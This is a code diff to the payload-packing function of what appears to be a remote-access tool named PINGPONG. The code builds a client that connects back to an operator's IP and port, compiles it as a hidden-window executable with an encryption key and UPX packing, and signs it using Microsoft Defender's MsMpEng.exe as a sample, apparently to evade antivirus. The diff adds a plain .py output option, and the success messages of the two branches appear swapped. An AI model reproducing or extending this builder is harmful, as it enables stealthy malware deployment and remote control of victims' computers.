@@ -57,11 +57,12 @@ def find_mod_location(lst, p):
 				is_find_end = True
 		line_count += 1
 	return start_list_location
-def pack(payload, printf, upx_command, is_ask=True):
+def pack(payload, printf, upx_command, file_format, is_ask=True):
 	if upx_command != " " and upx_command != "":
 			upx_command = "--upx-dir " + upx_command
 	else:
-		main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
+		if file_format == '.exe':
+			main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
 	glo = globals()
 	main.print_normal("payload>[*]Loading settings......")
 	payload_d = main.get_value('payload')
@@ -106,6 +107,7 @@ def pack(payload, printf, upx_command, is_ask=True):
 		main.print_normal(f"The key is: {key}")
 		current_path = abspath(__file__)
 		father_path = abspath(dirname(current_path) + sep + ".")
+		f_father_path = abspath(dirname(father_path) + sep + ".")
 		print(f"{install_path}/Lib/site-packages")
 		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w"
 		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
@@ -135,56 +137,67 @@ def pack(payload, printf, upx_command, is_ask=True):
 			init = get_mod_data(p, 1, init_location)
 			for _usage in open_usage:
 				exec(f"{_usage}_mod = get_mod_data(p, {_usage}_start_location, {_usage}_end_location)")
-		with open("./payload/payload.py", "w+", encoding="utf8") as a:
-			a.write(f'usage_list = {open_usage}')
-			a.write(init)
-			for _usage in open_usage:
-				exec(f"a.write({_usage}_mod)")
-			a.write(exit_init)
-			a.write(f"""
+		if file_format == '.exe':
+			with open("./payload/payload.py", "w+", encoding="utf8") as a:
+				a.write(f'usage_list = {open_usage}')
+				a.write(init)
+				for _usage in open_usage:
+					exec(f"a.write({_usage}_mod)")
+				a.write(exit_init)
+				a.write(f"""
 PINGPONG_client("{ip}", {port})""")
-		try:
-			system(command)
-			if printf:
-				main.print_normal("payload>[*]deleting temp files......")
-			remove("./payload/payload.py")
-			if isfile("payload.exe"):
-				remove("payload.exe")
-			if isdir("./payload/upload_payload"):
-				rmtree("./payload/upload_payload")
 			try:
-				mkdir("./payload/upload_payload")
-			except:
-				pass
-			if not printf:
-				move("dist/payload.exe", "./payload/upload_payload")
-				rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/upload_payload.exe")
-			else:
-				move("dist/payload.exe", "./payload/upload_payload")
-				rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/PINGPONG_payload.exe")
-			remove("payload.spec")
-			rmtree("build")
-			rmtree("dist")
-		except(ImportError):
-			main.print_warn("payload>[*]You might not install pyinstaller, installing it now......")
-			system("pip install pyinstaller")
+				system(command)
+				if printf:
+					main.print_normal("payload>[*]deleting temp files......")
+				remove("./payload/payload.py")
+				if isfile("payload.exe"):
+					remove("payload.exe")
+				if isdir("./payload/upload_payload"):
+					rmtree("./payload/upload_payload")
+				try:
+					mkdir("./payload/upload_payload")
+				except:
+					pass
+				if not printf:
+					move("dist/payload.exe", "./payload/upload_payload")
+					rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/upload_payload.exe")
+				else:
+					move("dist/payload.exe", "./payload/upload_payload")
+					rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/PINGPONG_payload.exe")
+				remove("payload.spec")
+				rmtree("build")
+				rmtree("dist")
+			except(ImportError):
+				main.print_warn("payload>[*]You might not install pyinstaller, installing it now......")
+				system("pip install pyinstaller")
+				if printf:
+					print("payload>[*]re-packing")
+				system(command)
+			except(FileNotFoundError):
+				if printf:
+					main.print_normal("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
+					main.print_warn("payload>[!]The payload file may be in the dir: ./dict")
+			main.print_good("payload>[*]signing......")
+			system(command_sign_1)
+			system(command_sign_2)
+			remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
+			remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
+			move(f"{father_path}/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}")
+			rename(f"{f_father_path}/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload.exe")
 			if printf:
-				print("payload>[*]re-packing")
-			system(command)
-		except(FileNotFoundError):
+				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.py")
+		elif file_format == '.py':
+			with open("payload.py", "w+", encoding="utf8") as a:
+				a.write(f'usage_list = {open_usage}')
+				a.write(init)
+				for _usage in open_usage:
+					exec(f"a.write({_usage}_mod)")
+				a.write(exit_init)
+				a.write(f"""
+PINGPONG_client("{ip}", {port})""")
 			if printf:
-				main.print_normal("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
-				main.print_warn("payload>[!]The payload file may be in the dir: ./dict")
-		main.print_good("payload>[*]signing......")
-		system(command_sign_1)
-		system(command_sign_2)
-		remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
-		remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
-		f_father_path = abspath(dirname(father_path) + sep + ".")
-		move(f"{father_path}/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}")
-		rename(f"{f_father_path}/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload.exe")
-		if printf:
-			main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
+				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
 	else:
 		main.print_normal("payload>[*]Back to the main console")
 		main.main()
